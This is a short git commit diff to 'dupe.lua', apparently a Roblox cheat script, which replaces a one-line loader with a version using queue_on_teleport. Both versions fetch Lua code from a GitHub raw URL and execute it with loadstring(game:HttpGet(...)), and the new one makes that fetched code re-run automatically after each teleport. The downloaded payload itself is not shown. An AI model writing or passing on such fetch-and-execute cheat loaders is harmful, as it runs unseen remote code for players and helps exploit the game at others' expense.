1b0f57783d639fbfa2f2412c0ceaed7a7a5858bd
qwertyu4t55567rgdf <153318778+qwertyu4t55567rgdf@users.noreply.github.com>
2024-09-22 20:38:59 +0300

    Update dupe.lua

--- dupe.lua
+++ dupe.lua
@@ -1,1 +1,4 @@
-loadstring(game:HttpGet('https://raw.githubusercontent.com/qwertyu4t55567rgdf/Gui-V2/refs/heads/main/RvvzFuckYou.lua'))()
+queue_on_teleport([[
+  wait(10)
+  loadstring(game:HttpGet('https://raw.githubusercontent.com/qwertyu4t55567rgdf/Gui-V2/refs/heads/main/RvvzFuckYou.lua'))()
+]])
